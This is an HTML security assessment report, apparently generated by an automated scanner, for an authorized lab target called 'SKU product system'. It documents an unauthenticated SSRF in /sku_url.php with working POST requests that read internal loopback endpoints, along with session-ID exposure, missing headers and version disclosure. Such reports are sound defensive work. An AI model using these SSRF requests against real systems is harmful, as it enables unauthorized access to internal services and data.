@@ -1,0 +1,646 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>VERDICT Report a-mr2usiqr-9pdy8x</title><style>
+*{box-sizing:border-box}
+body{font:14px/1.5 -apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;color:#1a1a1a;margin:0;padding:32px;background:#fff}
+h1{font-size:22px;margin:0 0 4px} h2{font-size:17px;margin:28px 0 10px;border-bottom:2px solid #eee;padding-bottom:4px}
+h3{font-size:15px;margin:18px 0 6px}
+code,pre{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+pre{background:#f6f8fa;border:1px solid #e3e6ea;border-radius:6px;padding:10px;overflow:auto;font-size:12.5px;white-space:pre-wrap;word-break:break-word}
+.meta{color:#555;font-size:13px;margin:0 0 2px}
+.badge{display:inline-block;color:#fff;border-radius:4px;padding:1px 8px;font-size:12px;font-weight:700;letter-spacing:.3px}
+.sumtags span{display:inline-block;margin:0 6px 6px 0;padding:2px 10px;border-radius:12px;background:#eef1f4;font-size:12px}
+.f{border:1px solid #e3e6ea;border-radius:8px;padding:14px 16px;margin:0 0 14px}
+.f .kv{color:#555;font-size:12.5px;margin:2px 0}
+.f .desc{margin:8px 0}
+table{border-collapse:collapse;width:100%;font-size:13px}
+th,td{border:1px solid #e3e6ea;padding:6px 8px;text-align:left;vertical-align:top}
+th{background:#f6f8fa}
+table.info td:first-child{width:170px;color:#555;font-weight:600;background:#fafbfc}
+.muted{color:#888}
+img.shot{max-width:220px;max-height:140px;border:1px solid #ddd;border-radius:4px}
+.ev{margin:10px 0 0;border-left:3px solid #cdd5dd;padding-left:10px}
+.ev .evh{font-size:12px;color:#555;margin:0 0 4px}
+.ev .lbl{font-size:11px;font-weight:700;letter-spacing:.4px;color:#5f7d8c;margin:6px 0 2px}
+.ev pre{margin:0;max-height:420px}
+html{scroll-behavior:smooth}
+.toc{background:#fafbfc;border:1px solid #e3e6ea;border-radius:8px;padding:10px 16px;margin:14px 0 8px}
+.toc .toctitle{font-weight:700;font-size:12px;color:#555;letter-spacing:.4px;text-transform:uppercase;margin:0 0 6px}
+.toc ul{margin:0;padding-left:18px} .toc>ul{padding-left:16px;list-style:none}
+.toc li{margin:2px 0;font-size:13px} .toc a{color:#0366d6;text-decoration:none} .toc a:hover{text-decoration:underline}
+.toc .sev{font-weight:700;font-size:11px;letter-spacing:.3px}
+@media print{body{padding:0}.f{break-inside:avoid}.ev pre{max-height:none}.toc{break-inside:avoid}}
+</style></head>
+<body>
+<h1>VERDICT Security Assessment Report</h1>
+<nav class="toc"><div class="toctitle">Contents</div><ul>
+<li><a href="#assessment-information">Assessment Information</a></li>
+<li><a href="#scope">Scope</a></li>
+<li><a href="#summary">Summary</a></li>
+<li><a href="#findings">Findings</a><ul>
+<li><a href="#finding-1">1. <span class="sev" style="color:#d32f2f">HIGH</span> [ssrf] Unauthenticated SSRF in /sku_url.php url parameter — reads internal-only service on 127.0.0.1:4455</a></li>
+<li><a href="#finding-2">2. <span class="sev" style="color:#f57c00">MEDIUM</span> [info-disclosure] Session ID exposed in HTML response body</a></li>
+<li><a href="#finding-3">3. <span class="sev" style="color:#c9a227">LOW</span> [headers] Missing HTTP security headers across all responses</a></li>
+<li><a href="#finding-4">4. <span class="sev" style="color:#5f7d8c">INFO</span> [info-disclosure] Technology version disclosure in HTTP response headers and body</a></li>
+</ul></li>
+<li><a href="#suspected">Suspected (needs manual verification)</a><ul>
+<li><a href="#finding-5">5. <span class="sev" style="color:#b00020">CRITICAL</span> [vulnerable-component] Outdated Apache httpd 2.4.56 — CVE-2024-38475 (mod_rewrite)</a></li>
+<li><a href="#finding-6">6. <span class="sev" style="color:#d32f2f">HIGH</span> [vulnerable-component] Apache 2.4.56 — multiple known High/Critical CVEs in later releases (CVE-2024-38474, CVE-2024-39573)</a></li>
+<li><a href="#finding-7">7. <span class="sev" style="color:#d32f2f">HIGH</span> [vulnerable-component] End-of-life PHP 8.0.30 — unsupported, unpatched (EOL 2023-11-26)</a></li>
+</ul></li>
+</ul></nav>
+<h2 id="assessment-information">Assessment Information</h2><table class="info">
+<tr><td>Assessment ID</td><td><code>a-mr2usiqr-9pdy8x</code></td></tr>
+<tr><td>Target</td><td><code>http://target.local:8081/</code></td></tr>
+<tr><td>Started</td><td>2026-07-02T01:56:24.919Z</td></tr>
+<tr><td>Generated</td><td>2026-07-02T00:00:00.000Z</td></tr>
+<tr><td>Phase</td><td>report</td></tr>
+<tr><td>Screens</td><td>13 mapped · 13 scanned · 0 remaining</td></tr>
+<tr><td>Hypotheses</td><td>0 (0 confirmed)</td></tr>
+<tr><td>Findings</td><td>4</td></tr>
+<tr><td>Tooling</td><td>VERDICT</td></tr>
+</table>
+<h2 id="scope">Scope</h2><table class="info">
+<tr><td>In-scope hosts</td><td><code>target.local:8081</code></td></tr>
+<tr><td>Out-of-scope hosts</td><td>&mdash;</td></tr>
+<tr><td>In-scope paths</td><td><code>/</code></td></tr>
+<tr><td>Out-of-scope paths</td><td>&mdash;</td></tr>
+<tr><td>Rate</td><td>30 req/min, max 2 concurrent</td></tr>
+</table>
+<h2 id="summary">Summary</h2>
+<p>4 finding(s)</p><p class="sumtags"><span><b style="color:#d32f2f">1</b> high</span><span><b style="color:#f57c00">1</b> medium</span><span><b style="color:#c9a227">1</b> low</span><span><b style="color:#5f7d8c">1</b> info</span></p>
+<p class="muted">Plus <b>3</b> suspected lead(s) needing manual verification (listed separately, not counted above).</p>
+<h2 id="findings">Findings</h2>
+<div class="f" id="finding-1">
+<h3><span class="badge" style="background:#d32f2f">HIGH</span> 1. [ssrf] Unauthenticated SSRF in /sku_url.php url parameter — reads internal-only service on 127.0.0.1:4455</h3>
+<div class="kv">Screen: <code>s-0005</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:8081/</div>
+<div class="desc">The unauthenticated form at /sku_url.php fetches an operator-supplied URL server-side and renders the response body inline (&quot;Fetched SKU Model&quot;). By supplying url=http://127.0.0.1:4455/ an external attacker makes the server request an internal-only service (the &quot;SKU model API&quot; bound to loopback, not reachable from outside) and receives its full response. The internal service documents further endpoints which are also retrievable: /sku_transfer returns internal inventory JSON ({&quot;sku&quot;:&quot;TRF123&quot;,&quot;description&quot;:&quot;Transferred Item 1&quot;,&quot;quantity&quot;:9},...) and /sku_validation returns validation JSON. A port allow-list restricts fetches to port 4455 (file:// and other ports return &quot;Invalid port. Only connections to port 4455 are allowed&quot;), which limits file-read/LFI but does NOT prevent reaching internal HTTP services on that port. Impact: unauthenticated read access to loopback/internal microservices and their data.</div>
+<div><b>Reproduction</b></div><pre>POST http://target.local:8081/sku_url.php with Content-Type: application/x-www-form-urlencoded and body `url=http://127.0.0.1:4455/`. Response inlines the internal service banner &quot;SKU Model Service is running on port 4455 ... BETA Documentation&quot; under a &quot;Fetched SKU Model&quot; heading. Compare to negative control `url=` (empty) which returns no fetched content. Deeper impact: `url=http://127.0.0.1:4455/sku_transfer` and `url=http://127.0.0.1:4455/sku_validation` return internal JSON datasets.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr2w1qb5-3d</code> — <code>artifacts/s-0005/ev-mr2w1qb5-3d/</code></div><div class="lbl">REQUEST</div><pre>POST /sku_url.php HTTP/1.1
+Host: target.local:8081
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+content-type: application/x-www-form-urlencoded
+
+url=</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 455
+content-type: text/html; charset=UTF-8
+date: Thu, 02 Jul 2026 02:31:33 GMT
+keep-alive: timeout=5, max=100
+server: Apache/2.4.56 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/8.0.30
+
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;SKU Model&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;h1&gt;SKU Model&lt;/h1&gt;
+    
+    &lt;form method=&quot;post&quot; action=&quot;&quot;&gt;
+        &lt;label for=&quot;url&quot;&gt;Enter URL:&lt;/label&gt;
+        &lt;input type=&quot;text&quot; id=&quot;url&quot; name=&quot;url&quot; value=&quot;&quot; size=&quot;100&quot;&gt;
+        &lt;input type=&quot;submit&quot; value=&quot;Fetch SKU Model&quot;&gt;
+    &lt;/form&gt;
+    &lt;p&gt;Your IP address: target.local&lt;/p&gt;
+    &lt;p&gt;SKU model API: 127.0.0.1:4455&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;index.php&quot;&gt;Back&lt;/a&gt;&lt;/p&gt;
+    
+
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr2w11js-3c</code> — <code>artifacts/s-0005/ev-mr2w11js-3c/</code></div><div class="lbl">REQUEST</div><pre>POST /sku_url.php HTTP/1.1
+Host: target.local:8081
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+content-type: application/x-www-form-urlencoded
+
+url=http://127.0.0.1:4455/</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 1141
+content-type: text/html; charset=UTF-8
+date: Thu, 02 Jul 2026 02:31:01 GMT
+keep-alive: timeout=5, max=100
+server: Apache/2.4.56 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/8.0.30
+
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;SKU Model&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;h1&gt;SKU Model&lt;/h1&gt;
+    
+    &lt;form method=&quot;post&quot; action=&quot;&quot;&gt;
+        &lt;label for=&quot;url&quot;&gt;Enter URL:&lt;/label&gt;
+        &lt;input type=&quot;text&quot; id=&quot;url&quot; name=&quot;url&quot; value=&quot;http://127.0.0.1:4455/&quot; size=&quot;100&quot;&gt;
+        &lt;input type=&quot;submit&quot; value=&quot;Fetch SKU Model&quot;&gt;
+    &lt;/form&gt;
+    &lt;p&gt;Your IP address: target.local&lt;/p&gt;
+    &lt;p&gt;SKU model API: 127.0.0.1:4455&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;index.php&quot;&gt;Back&lt;/a&gt;&lt;/p&gt;
+            &lt;h2&gt;Fetched SKU Model&lt;/h2&gt;
+        &lt;div&gt;
+            SKU Model Service is running on port 4455. &lt;br/&gt;&lt;br/&gt;Sku Service Remote Function - BETA Documentation.&lt;br/&gt;&lt;br/&gt;&lt;strong&gt;Transfer&lt;/strong&gt; - Allow you to view transfer between SKU&lt;br/&gt;&lt;ul&gt;&lt;li&gt;http://127.0.0.1:4455/sku_transfer&lt;/li&gt;&lt;/ul&gt;&lt;strong&gt;Validate&lt;/strong&gt; - Allow you to validate a SKU number&lt;br/&gt;&lt;ul&gt;&lt;li&gt;http://127.0.0.1:4455/sku_validation&lt;/li&gt;&lt;/ul&gt;&lt;strong&gt;Process&lt;/strong&gt; - Allow you to upload and process an SKU number with a valid blob data&lt;br/&gt;&lt;li&gt;Method: POST&lt;/li&gt;&lt;li&gt;Parameters:  data JPG file of the SKU number. &lt;/li&gt;&lt;ul&gt;&lt;li&gt;http://127.0.0.1:4455/sku_process&lt;/li&gt;&lt;/ul&gt;
+        &lt;/div&gt;
+    
+
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr2w1rf9-3e</code> — <code>artifacts/s-0005/ev-mr2w1rf9-3e/</code></div><div class="lbl">REQUEST</div><pre>POST /sku_url.php HTTP/1.1
+Host: target.local:8081
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+content-type: application/x-www-form-urlencoded
+
+url=http://127.0.0.1:4455/</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 1141
+content-type: text/html; charset=UTF-8
+date: Thu, 02 Jul 2026 02:31:35 GMT
+keep-alive: timeout=5, max=99
+server: Apache/2.4.56 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/8.0.30
+
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;SKU Model&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;h1&gt;SKU Model&lt;/h1&gt;
+    
+    &lt;form method=&quot;post&quot; action=&quot;&quot;&gt;
+        &lt;label for=&quot;url&quot;&gt;Enter URL:&lt;/label&gt;
+        &lt;input type=&quot;text&quot; id=&quot;url&quot; name=&quot;url&quot; value=&quot;http://127.0.0.1:4455/&quot; size=&quot;100&quot;&gt;
+        &lt;input type=&quot;submit&quot; value=&quot;Fetch SKU Model&quot;&gt;
+    &lt;/form&gt;
+    &lt;p&gt;Your IP address: target.local&lt;/p&gt;
+    &lt;p&gt;SKU model API: 127.0.0.1:4455&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;index.php&quot;&gt;Back&lt;/a&gt;&lt;/p&gt;
+            &lt;h2&gt;Fetched SKU Model&lt;/h2&gt;
+        &lt;div&gt;
+            SKU Model Service is running on port 4455. &lt;br/&gt;&lt;br/&gt;Sku Service Remote Function - BETA Documentation.&lt;br/&gt;&lt;br/&gt;&lt;strong&gt;Transfer&lt;/strong&gt; - Allow you to view transfer between SKU&lt;br/&gt;&lt;ul&gt;&lt;li&gt;http://127.0.0.1:4455/sku_transfer&lt;/li&gt;&lt;/ul&gt;&lt;strong&gt;Validate&lt;/strong&gt; - Allow you to validate a SKU number&lt;br/&gt;&lt;ul&gt;&lt;li&gt;http://127.0.0.1:4455/sku_validation&lt;/li&gt;&lt;/ul&gt;&lt;strong&gt;Process&lt;/strong&gt; - Allow you to upload and process an SKU number with a valid blob data&lt;br/&gt;&lt;li&gt;Method: POST&lt;/li&gt;&lt;li&gt;Parameters:  data JPG file of the SKU number. &lt;/li&gt;&lt;ul&gt;&lt;li&gt;http://127.0.0.1:4455/sku_process&lt;/li&gt;&lt;/ul&gt;
+        &lt;/div&gt;
+    
+
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-2">
+<h3><span class="badge" style="background:#f57c00">MEDIUM</span> 2. [info-disclosure] Session ID exposed in HTML response body</h3>
+<div class="kv">Screen: <code>s-0001</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:8081/</div>
+<div class="desc">The root page renders a freshly generated session ID in plaintext inside the HTML response body on every request: &quot;Hello, your temporally session id is &amp;lt;32-char hex&amp;gt;&quot;. Each request produces a unique token, confirming the server generates and then immediately exposes a session identifier in the page body. This token may be harvested by CDN/proxy logs, browser history, Referer headers, or any intermediary that captures response bodies.</div>
+<div><b>Reproduction</b></div><pre>1. GET http://target.local:8081/ (no auth required)
+2. Observe the first line of the response body: &quot;Hello, your temporally session id is &amp;lt;32-char hex&amp;gt;&quot;
+3. Repeat — a fresh hex token appears on every request.
+Negative control: GET /nonexistent_control_path.html returns a standard 404 with no session ID (ev-mr2v2gzy-6).</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr2v2gzy-6</code> — <code>artifacts/s-0001/ev-mr2v2gzy-6/</code></div><div class="lbl">REQUEST</div><pre>GET /nonexistent_control_path.html HTTP/1.1
+Host: target.local:8081
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 404
+connection: Keep-Alive
+content-length: 278
+content-type: text/html; charset=iso-8859-1
+date: Thu, 02 Jul 2026 02:04:08 GMT
+keep-alive: timeout=5, max=99
+server: Apache/2.4.56 (Debian)
+
+&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;404 Not Found&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Not Found&lt;/h1&gt;
+&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;
+&lt;hr&gt;
+&lt;address&gt;Apache/2.4.56 (Debian) Server at target.local Port 8081&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr2v1goj-3</code> — <code>artifacts/s-0001/ev-mr2v1goj-3/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:8081
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 587
+content-type: text/html; charset=UTF-8
+date: Thu, 02 Jul 2026 02:03:21 GMT
+keep-alive: timeout=5, max=100
+server: Apache/2.4.56 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/8.0.30
+
+
+Hello, your temporally session id is d2fbeb78c9f34f0154b0c70cc273b2ae
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;Hello&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;h1&gt;Welcome to the SKU product system !&lt;/h1&gt;
+    &lt;p&gt;Profile: anonymous&lt;/p&gt;
+    &lt;p&gt;Sandbox mode: Enabled&lt;/p&gt;
+    &lt;p&gt;Twig version: 3.10.3&lt;/p&gt;
+    
+    &lt;h2&gt;SKU Management&lt;/h2&gt;
+    &lt;ul&gt;
+        &lt;li&gt;&lt;a href=&quot;sku_system.php&quot;&gt;View SKU List&lt;/a&gt;&lt;/li&gt;
+        &lt;li&gt;&lt;a href=&quot;sku_search.php&quot;&gt;Search SKU&lt;/a&gt;&lt;/li&gt;
+        &lt;li&gt;&lt;a href=&quot;sku_add.php&quot;&gt;Add SKU&lt;/a&gt;&lt;/li&gt;
+        &lt;li&gt;&lt;a href=&quot;sku_url.php&quot;&gt;Process your SKU model&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr2v2gbw-5</code> — <code>artifacts/s-0001/ev-mr2v2gbw-5/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:8081
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 587
+content-type: text/html; charset=UTF-8
+date: Thu, 02 Jul 2026 02:04:07 GMT
+keep-alive: timeout=5, max=100
+server: Apache/2.4.56 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/8.0.30
+
+
+Hello, your temporally session id is 65c41e846c851cdd2e361760a7060edd
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;Hello&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;h1&gt;Welcome to the SKU product system !&lt;/h1&gt;
+    &lt;p&gt;Profile: anonymous&lt;/p&gt;
+    &lt;p&gt;Sandbox mode: Enabled&lt;/p&gt;
+    &lt;p&gt;Twig version: 3.10.3&lt;/p&gt;
+    
+    &lt;h2&gt;SKU Management&lt;/h2&gt;
+    &lt;ul&gt;
+        &lt;li&gt;&lt;a href=&quot;sku_system.php&quot;&gt;View SKU List&lt;/a&gt;&lt;/li&gt;
+        &lt;li&gt;&lt;a href=&quot;sku_search.php&quot;&gt;Search SKU&lt;/a&gt;&lt;/li&gt;
+        &lt;li&gt;&lt;a href=&quot;sku_add.php&quot;&gt;Add SKU&lt;/a&gt;&lt;/li&gt;
+        &lt;li&gt;&lt;a href=&quot;sku_url.php&quot;&gt;Process your SKU model&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-3">
+<h3><span class="badge" style="background:#c9a227">LOW</span> 3. [headers] Missing HTTP security headers across all responses</h3>
+<div class="kv">Screen: <code>s-0001</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:8081/</div>
+<div class="desc">All application responses return only `Content-Type`. No security-relevant headers are set: absent are Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy, and (for HTTPS) Strict-Transport-Security. The absence of X-Frame-Options and CSP frame-ancestors leaves the app vulnerable to clickjacking. The absence of X-Content-Type-Options enables MIME sniffing attacks.</div>
+<div><b>Reproduction</b></div><pre>1. GET http://target.local:8081/ — response headers: {&quot;content-type&quot;:&quot;text/html; charset=UTF-8&quot;} only
+2. Confirmed across two separate requests (ev-mr2v1goj-3, ev-mr2v2gbw-5) and error pages (ev-mr2v2gzy-6)
+3. Missing: Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, Referrer-Policy</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr2v2gzy-6</code> — <code>artifacts/s-0001/ev-mr2v2gzy-6/</code></div><div class="lbl">REQUEST</div><pre>GET /nonexistent_control_path.html HTTP/1.1
+Host: target.local:8081
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 404
+connection: Keep-Alive
+content-length: 278
+content-type: text/html; charset=iso-8859-1
+date: Thu, 02 Jul 2026 02:04:08 GMT
+keep-alive: timeout=5, max=99
+server: Apache/2.4.56 (Debian)
+
+&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;404 Not Found&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Not Found&lt;/h1&gt;
+&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;
+&lt;hr&gt;
+&lt;address&gt;Apache/2.4.56 (Debian) Server at target.local Port 8081&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr2v1goj-3</code> — <code>artifacts/s-0001/ev-mr2v1goj-3/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:8081
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 587
+content-type: text/html; charset=UTF-8
+date: Thu, 02 Jul 2026 02:03:21 GMT
+keep-alive: timeout=5, max=100
+server: Apache/2.4.56 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/8.0.30
+
+
+Hello, your temporally session id is d2fbeb78c9f34f0154b0c70cc273b2ae
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;Hello&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;h1&gt;Welcome to the SKU product system !&lt;/h1&gt;
+    &lt;p&gt;Profile: anonymous&lt;/p&gt;
+    &lt;p&gt;Sandbox mode: Enabled&lt;/p&gt;
+    &lt;p&gt;Twig version: 3.10.3&lt;/p&gt;
+    
+    &lt;h2&gt;SKU Management&lt;/h2&gt;
+    &lt;ul&gt;
+        &lt;li&gt;&lt;a href=&quot;sku_system.php&quot;&gt;View SKU List&lt;/a&gt;&lt;/li&gt;
+        &lt;li&gt;&lt;a href=&quot;sku_search.php&quot;&gt;Search SKU&lt;/a&gt;&lt;/li&gt;
+        &lt;li&gt;&lt;a href=&quot;sku_add.php&quot;&gt;Add SKU&lt;/a&gt;&lt;/li&gt;
+        &lt;li&gt;&lt;a href=&quot;sku_url.php&quot;&gt;Process your SKU model&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr2v2gbw-5</code> — <code>artifacts/s-0001/ev-mr2v2gbw-5/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:8081
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 587
+content-type: text/html; charset=UTF-8
+date: Thu, 02 Jul 2026 02:04:07 GMT
+keep-alive: timeout=5, max=100
+server: Apache/2.4.56 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/8.0.30
+
+
+Hello, your temporally session id is 65c41e846c851cdd2e361760a7060edd
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;Hello&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;h1&gt;Welcome to the SKU product system !&lt;/h1&gt;
+    &lt;p&gt;Profile: anonymous&lt;/p&gt;
+    &lt;p&gt;Sandbox mode: Enabled&lt;/p&gt;
+    &lt;p&gt;Twig version: 3.10.3&lt;/p&gt;
+    
+    &lt;h2&gt;SKU Management&lt;/h2&gt;
+    &lt;ul&gt;
+        &lt;li&gt;&lt;a href=&quot;sku_system.php&quot;&gt;View SKU List&lt;/a&gt;&lt;/li&gt;
+        &lt;li&gt;&lt;a href=&quot;sku_search.php&quot;&gt;Search SKU&lt;/a&gt;&lt;/li&gt;
+        &lt;li&gt;&lt;a href=&quot;sku_add.php&quot;&gt;Add SKU&lt;/a&gt;&lt;/li&gt;
+        &lt;li&gt;&lt;a href=&quot;sku_url.php&quot;&gt;Process your SKU model&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-4">
+<h3><span class="badge" style="background:#5f7d8c">INFO</span> 4. [info-disclosure] Technology version disclosure in HTTP response headers and body</h3>
+<div class="kv">Screen: <code>s-0001</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:8081/</div>
+<div class="desc">Server responses disclose precise technology versions on every request: (1) `Server: Apache/2.4.56 (Debian)` response header, (2) `X-Powered-By: PHP/8.0.30` response header, and (3) the HTML body renders `Twig version: 3.10.3`. This gives an attacker an exact component fingerprint without any probing.</div>
+<div><b>Reproduction</b></div><pre>1. GET http://target.local:8081/
+2. Inspect response headers: Server: Apache/2.4.56 (Debian), X-Powered-By: PHP/8.0.30
+3. Inspect response body: &amp;lt;p&amp;gt;Twig version: 3.10.3&amp;lt;/p&amp;gt;
+4. Also visible in Apache error pages (ev-mr2v2gzy-6): &quot;Apache/2.4.56 (Debian) Server at ... Port 8081&quot;</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr2v2gzy-6</code> — <code>artifacts/s-0001/ev-mr2v2gzy-6/</code></div><div class="lbl">REQUEST</div><pre>GET /nonexistent_control_path.html HTTP/1.1
+Host: target.local:8081
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 404
+connection: Keep-Alive
+content-length: 278
+content-type: text/html; charset=iso-8859-1
+date: Thu, 02 Jul 2026 02:04:08 GMT
+keep-alive: timeout=5, max=99
+server: Apache/2.4.56 (Debian)
+
+&lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;404 Not Found&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Not Found&lt;/h1&gt;
+&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;
+&lt;hr&gt;
+&lt;address&gt;Apache/2.4.56 (Debian) Server at target.local Port 8081&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr2v1goj-3</code> — <code>artifacts/s-0001/ev-mr2v1goj-3/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:8081
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: Keep-Alive
+content-length: 587
+content-type: text/html; charset=UTF-8
+date: Thu, 02 Jul 2026 02:03:21 GMT
+keep-alive: timeout=5, max=100
+server: Apache/2.4.56 (Debian)
+vary: Accept-Encoding
+x-powered-by: PHP/8.0.30
+
+
+Hello, your temporally session id is d2fbeb78c9f34f0154b0c70cc273b2ae
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;Hello&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;h1&gt;Welcome to the SKU product system !&lt;/h1&gt;
+    &lt;p&gt;Profile: anonymous&lt;/p&gt;
+    &lt;p&gt;Sandbox mode: Enabled&lt;/p&gt;
+    &lt;p&gt;Twig version: 3.10.3&lt;/p&gt;
+    
+    &lt;h2&gt;SKU Management&lt;/h2&gt;
+    &lt;ul&gt;
+        &lt;li&gt;&lt;a href=&quot;sku_system.php&quot;&gt;View SKU List&lt;/a&gt;&lt;/li&gt;
+        &lt;li&gt;&lt;a href=&quot;sku_search.php&quot;&gt;Search SKU&lt;/a&gt;&lt;/li&gt;
+        &lt;li&gt;&lt;a href=&quot;sku_add.php&quot;&gt;Add SKU&lt;/a&gt;&lt;/li&gt;
+        &lt;li&gt;&lt;a href=&quot;sku_url.php&quot;&gt;Process your SKU model&lt;/a&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
